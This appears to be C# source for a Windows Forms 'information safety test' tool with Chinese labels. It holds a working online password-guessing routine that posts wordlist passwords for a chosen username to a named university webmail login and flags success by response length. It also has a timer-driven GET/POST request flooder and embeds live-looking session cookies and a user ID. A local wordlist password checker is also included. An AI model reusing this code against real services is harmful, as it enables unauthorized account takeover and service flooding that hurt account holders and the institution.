using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections;
namespace Information_Safty_Test
{
    public partial class PassW_Break : Form
    {
        double b_count = 0;
        double b_target = 0;
        double g_count = 0;
        double g_target = 0;
        double p_count = 0;
        double p_target = 0;
        double localtimerint = 0;
        public PassW_Break()
        {
            InitializeComponent();
        }
        private void PassW_Break_Load(object sender, EventArgs e)
        {
            BrowserTimer.Interval = 200;
            GetTimers.Interval = 20;
            PostTimer.Interval = 20;
            StatusTimer.Interval = 20;
        }
        public static string GetHtmlFromPost(string urlString, Encoding encoding, string postDataString)
        {
            CookieContainer cookieContainer = new CookieContainer();
            HttpWebRequest httpWebRequest = null;
            HttpWebResponse httpWebResponse = null;
            Stream inputStream = null;
            Stream outputStream = null;
            StreamReader streamReader = null;
            string htmlString = string.Empty;
            byte[] postDataByte = encoding.GetBytes(postDataString);
            try
            {
                httpWebRequest = WebRequest.Create(urlString) as HttpWebRequest;
            }
            catch (Exception ex)
            {
                throw new Exception("建立页面请求时发生错误！", ex);
            }
            httpWebRequest.Method = "POST";
            httpWebRequest.KeepAlive = false;
            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
            httpWebRequest.CookieContainer = cookieContainer;
            httpWebRequest.ContentLength = postDataByte.Length;
            try
            {
                inputStream = httpWebRequest.GetRequestStream();
                inputStream.Write(postDataByte, 0, postDataByte.Length);
            }
            catch (Exception ex)
            {
                throw new Exception("发送POST数据时发生错误！", ex);
            }
            finally
            {
                inputStream.Close();
            }
            try
            {
                httpWebResponse = httpWebRequest.GetResponse() as HttpWebResponse;
                outputStream = httpWebResponse.GetResponseStream();
                streamReader = new StreamReader(outputStream, encoding);
                htmlString = streamReader.ReadToEnd();
            }
            catch (Exception ex)
            {
                throw new Exception("接受服务器返回页面时发生错误！", ex);
            }
            finally
            {
                streamReader.Close();
            }
            foreach (Cookie cookie in httpWebResponse.Cookies)
            {
                cookieContainer.Add(cookie);
            }
            return htmlString;
        }
        public static string GetHtmlFromGet(string urlString, Encoding encoding)
        {
            HttpWebRequest httpWebRequest = null;
            HttpWebResponse httpWebRespones = null;
            Stream stream = null;
            string htmlString = string.Empty;

            try
            {
                httpWebRequest = WebRequest.Create(urlString) as HttpWebRequest;
            }
            catch (Exception ex)
            {
                throw new Exception("建立页面请求时发生错误！", ex);
            }
            httpWebRequest.UserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)";
            Cookie myCookie1 = new Cookie("ASPSESSIONIDQQTTSSCD", "NHEJJMGCAFEIEHHFPMLHCMOI", "/", "html5.17-g.com");
            Cookie myCookie2 = new Cookie("nid3", "ok123", "/", "html5.17-g.com");
            CookieContainer test = new CookieContainer();
            test.Add(myCookie1);
            test.Add(myCookie2);
            httpWebRequest.CookieContainer = test;
            try
            {
                httpWebRespones = (HttpWebResponse)httpWebRequest.GetResponse();
                stream = httpWebRespones.GetResponseStream();
            }
            catch (Exception ex)
            {
                throw new Exception("接受服务器返回页面时发生错误！", ex);
            }
            StreamReader streamReader = new StreamReader(stream, encoding);
            try
            {
                htmlString = streamReader.ReadToEnd();
            }
            catch (Exception ex)
            {
                throw new Exception("读取页面数据时发生错误！", ex);
            }
            streamReader.Close();
            stream.Close();
            return htmlString;
        }
        private void P_R_Button_Click(object sender, EventArgs e)
        {
            //this.Hide();
            Remote_Control_Form RCF = new Remote_Control_Form();
            RCF.Show();
            this.Hide();
            this.Close();
        }

        private void Remote_Control_Click(object sender, EventArgs e)
        {
            //this.Hide();
            Form1 RCF = new Form1();
            RCF.Show();
            this.Hide();
            this.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            PassW_Break RCF = new PassW_Break();
            RCF.Show();
            this.Hide();
            this.Close();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private int passWord_Break(string username,string password)
        {
            try
            {
                HttpWebRequest requestCookies = (HttpWebRequest)WebRequest.Create("http://mail.lzu.edu.cn/?cus=1");
                requestCookies.ContentType = "application/x-www-form-urlencoded";
                requestCookies.Referer = "http://mail.lzu.edu.cn/coremail/XT3/index.jsp";
                requestCookies.Headers.Set("Pragma", "no-cache");
                requestCookies.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                requestCookies.Headers.Set("Accept-Language", "zh-CN");
                requestCookies.Headers.Set("Accept-Encoding", "gzip, deflate");
                string temp = "CoremailReferer=http%3A%2F%2Fmail.lzu.edu.cn%2F%3Fcus%3D1; Coremail.sid=CAMgYVUURoIenwMZflUUNyKPRbYJojxl; Coremail=eac0115a4732dc09e5b0d2db8a867346; uid=dongxf14; locale=zh_CN";
                requestCookies.Headers.Set("cookie", temp);
                requestCookies.Method = "POST";

                Encoding encoding23 = Encoding.GetEncoding("UTF-8");
                byte[] bytesToPost = encoding23.GetBytes("locale=zh_CN&uid=" + username + "&nodetect=false&password=" + password + "&action%3Alogin=HTTP/1.1");
                requestCookies.ContentLength = bytesToPost.Length;
                Stream requestStream = requestCookies.GetRequestStream();
                requestStream.Write(bytesToPost, 0, bytesToPost.Length);
                requestStream.Close();
                HttpWebResponse responseSorce = (HttpWebResponse)requestCookies.GetResponse();
                StreamReader reader = new StreamReader(responseSorce.GetResponseStream(), Encoding.Default);
                string content = reader.ReadToEnd();
                return (content.Length);
            }
            catch
            {
                //MessageBox.Show("无法连接至服务器");
                backText.Text += "\r\n无法连接至服务器";
                return -1;          
            }
        }

        private void BrowserStart_Click(object sender, EventArgs e)
        {
            try
            {
                StatusTimer.Enabled = true;
                webBrowser1.Navigate(new Uri(Addr.Text, UriKind.Absolute));
                b_target = Convert.ToInt32(Times.Text);
                BrowserStart.Text = "启动";
                if (BrowserTimer.Enabled == true)
                    BrowserTimer.Enabled = false;
                else
                {
                    b_count = 0;
                    BrowserTimer.Interval = Convert.ToInt32(EHztextbox.Text);
                    StatusTimer.Interval = Convert.ToInt32(EHztextbox.Text);
                    BrowserTimer.Enabled = true;
                    BrowserStart.Text = "停止";
                }
            }
            catch
            {
                MessageBox.Show("无法访问地址！");
            }
        }

        private void GetStart_Click(object sender, EventArgs e)
        {
            try
            {
                StatusTimer.Enabled = true;
                GetStart.Text = "启动";
                g_target = Convert.ToInt32(TimesGet.Text);
                if (GetTimers.Enabled == true)
                {
                    GetTimers.Enabled = false;
                }
                else
                {
                    g_count = 0;
                    GetTimers.Interval = Convert.ToInt32(GHztextbox.Text);
                    StatusTimer.Interval = Convert.ToInt32(GHztextbox.Text);
                    GetTimers.Enabled = true;
                    GetStart.Text = "停止";
                }
            }
            catch
            {
                MessageBox.Show("无法访问地址！");
            }
        }

        private void PostStart_Click(object sender, EventArgs e)
        {
            try
            {
                StatusTimer.Enabled = true;
                PostStart.Text = "启动";
                p_target = Convert.ToInt32(TimesPost.Text);
                if (PostTimer.Enabled == true)
                {
                    PostTimer.Enabled = false;
                }
                else
                {
                    p_count = 0;
                    PostTimer.Interval = Convert.ToInt32(PHztextbox.Text);
                    StatusTimer.Interval = Convert.ToInt32(PHztextbox.Text);
                    PostTimer.Enabled = true;
                    PostStart.Text = "停止";
                }
            }
            catch
            {
                MessageBox.Show("无法访问地址！");
            }
        }

        private void GetTimers_Tick(object sender, EventArgs e)
        {
            if (g_count >= g_target)
            {
                GetTimers.Enabled = false;
            }
            else
            {
                GetHtmlFromGet(AddrGet.Text, Encoding.UTF8);
                g_count = g_count + 1;
            }
        }

        private void PostTimer_Tick_1(object sender, EventArgs e)
        {
            if (p_count >= p_target)
            {
                PostTimer.Enabled = false;
            }
            else
            {
                GetHtmlFromPost(AddrPost.Text, Encoding.UTF8, Content.Text);
                p_count = p_count + 1;
                ProcessBar.Value = Convert.ToInt32((p_count / p_target) * 100);
            }
        }

        private void BrowserTimer_Tick_1(object sender, EventArgs e)
        {
            if (b_count >= b_target)
            {
                BrowserTimer.Enabled = false;
            }
            else
            {
                webBrowser1.Refresh();
                b_count = b_count + 1;
            }
        }

        private void StatusTimer_Tick_1(object sender, EventArgs e)
        {
                double total_count = b_count + g_count + p_count;
                double total_target = b_target + g_target + p_target;
                if (total_count == 0 || total_target == 0)
                    Status.Text = "就绪";
                else
                {
                    Status.Text = "已完成数目: " + total_count.ToString() + " （浏览器完成 " + b_count.ToString() + " 次, Get 方法完成 " + g_count.ToString() + " 次，Post 方法完成 " + p_count.ToString() + " 次）";
                    ProcessBar.Value = Convert.ToInt32(total_count / total_target * 100);
                    if (ProcessBar.Value == 100)
                    {
                        Status.Text = "任务已完成";
                        BrowserStart.Text = "启动";
                        GetStart.Text = "启动";
                        PostStart.Text = "启动";
                        b_target = 0; g_target = 0; p_target = 0;
                        b_count = 0; g_count = 0; p_count = 0;
                        StatusTimer.Enabled = false;
                    }
                }
            
        }
        private void remotepassword(int m)
        {
                string username = userIdText.Text;//用户名
                string password;//密码
                backText.Text = "正在破解中..." + "\r\n正在尝试密码本 " + m;
                StreamReader Cfile = new StreamReader(".\\password\\" + m + ".txt", Encoding.Default);
                string temp;
                int i, j;
                int num1, num2;
                temp = Cfile.ReadLine();
                i = temp.IndexOf(" ") + 1;
                j = temp.Length - i;
                password = temp.Substring(i, j);
                num1 = passWord_Break(username, password);
                if(num1==-1)
                {
                    button4.Text = "开始破解";
                    localtimerint = 0;
                    Status.Text = "就绪";
                    ProcessBar.Value = 0;
                    remotetimer.Enabled = false;
                    Cfile.Close();
                    return;
                }
                while ((temp = Cfile.ReadLine()) != null)
                {
                    i = temp.IndexOf(" ") + 1;
                    j = temp.Length - i;
                    password = temp.Substring(i, j);
                    num2 = passWord_Break(username, password);
                    if (num2 == -1)
                    {
                        button4.Text = "开始破解";
                        localtimerint = 0;
                        Status.Text = "就绪";
                        ProcessBar.Value = 0;
                        remotetimer.Enabled = false;
                        Cfile.Close();
                        return;
                    }
                    if ((num2 - num1) > 100)
                    {
                        backText.Text += "\r\n成功破解密码:" + password + "\r\n";
                        button4.Text = "开始破解";
                        localtimerint = 0;
                        Status.Text = "就绪";
                        ProcessBar.Value = 0;
                        remotetimer.Enabled = false;
                        Cfile.Close();
                        return;
                    }
                }
                if (m == 184)
                {
                    backText.Text += "密码破解失败，账户安全度高\r\n";
                    button4.Text = "开始破解";
                    localtimerint = 0;
                    Status.Text = "就绪";
                    ProcessBar.Value = 0;
                    remotetimer.Enabled = false;
                    Cfile.Close();
                    return;
                }
                Cfile.Close();
        }
        private void button4_Click_1(object sender, EventArgs e)
        {
            if (userIdText.Text == "")
            {
                MessageBox.Show("未输入账号！");
            }
            else
            {
                    button4.Text = "开始破解";
                    if (remotetimer.Enabled == true)
                    {
                        remotetimer.Enabled = false;
                        button4.Text = "开始破解";
                        localtimerint = 0;
                        Status.Text = "就绪";
                        backText.Text = "";
                        ProcessBar.Value = 0;
                    }
                    else
                    {
                        localtimerint = 0;
                        remotetimer.Interval = Convert.ToInt32(RHztextbox.Text);
                        remotetimer.Enabled = true;
                        button4.Text = "停止";
                    }
                
            }
           
        }
        private void localpassword(int i)
        { 

            backText.Text = "正在破解中..." + "\r\n正在尝试密码本 " + i;
            StreamReader Cfile = new StreamReader(".\\password\\" + i + ".txt", Encoding.Default);
            string temp, password;
            while ((temp = Cfile.ReadLine()) != null)
            {
                int m = temp.IndexOf(" ") + 1;
                int n = temp.Length - m;
                password = temp.Substring(m, n);
                //backText.Text += "\r\n" + password;
                if (password == passText.Text)
                {
                    backText.Text += "\r\n密码已在密码本找到，密码不安全";
                    button6.Text = "开始破解";
                    localtimerint = 0;
                    Status.Text = "就绪";
                    ProcessBar.Value = 0;
                    localtimer.Enabled = false;
                    return;
                 }

             }
             Cfile.Close();
             backText.Refresh();
             if (i == 184)
             {
                backText.Text += "\r\n密码不在密码本中，密码安全";
                button6.Text = "开始破解";
                localtimerint = 0;
                Status.Text = "就绪";
                ProcessBar.Value = 0;
                localtimer.Enabled = false;
              }

        }
        private void button6_Click(object sender, EventArgs e)
        {
            if (passText.Text == "")
            {
                MessageBox.Show("未输入密码！");
            }
            else
            {
                try
                {
                    button6.Text = "开始破解";
                    if (localtimer.Enabled == true)
                    {
                        localtimer.Enabled = false;
                        button6.Text = "开始破解";
                        localtimerint = 0;
                        Status.Text = "就绪";
                        backText.Text = "";
                        ProcessBar.Value = 0;
                    }
                    else
                    {
                        localtimerint = 0;
                        localtimer.Interval = Convert.ToInt32(LHztextbox.Text);
                        localtimer.Enabled = true;
                        button6.Text = "停止";
                    }
                }
                catch
                {
                    MessageBox.Show("破解过程发生未知错误！");
                }   
            }
           
        }

        private void localtimer_Tick(object sender, EventArgs e)
        {
                if (localtimerint == 0)
                {
                    Status.Text = "就绪";
                    localtimerint=localtimerint+1;
                }
                else
                {
                    localpassword((int)localtimerint);
                    Status.Text = "已完成数目: " + localtimerint.ToString();
                    ProcessBar.Value = Convert.ToInt32(localtimerint / 184 * 100);
                    localtimerint=localtimerint+1;
                    if (ProcessBar.Value == 100)
                    {
                        Status.Text = "任务已完成";
                        button6.Text = "开始破解";
                        Status.Text = "就绪";
                        ProcessBar.Value = 0;
                        localtimerint = 0;
                        localtimer.Enabled = false;
                    }
                }
            
        }

        private void remotetimer_Tick(object sender, EventArgs e)
        {
                if (localtimerint == 0)
                {
                    Status.Text = "就绪";
                    localtimerint = localtimerint + 1;
                }
                else
                {
                    remotepassword((int)localtimerint);
                    Status.Text = "已完成数目: " + localtimerint.ToString();
                    ProcessBar.Value = Convert.ToInt32(localtimerint / 184 * 100);
                    localtimerint = localtimerint + 1;
                    if (ProcessBar.Value == 100)
                    {
                        Status.Text = "任务已完成";
                        button6.Text = "开始破解";
                        Status.Text = "就绪";
                        ProcessBar.Value = 0;
                        localtimerint = 0;
                        remotetimer.Enabled = false;
                    }
                }
        }

  
    }
}
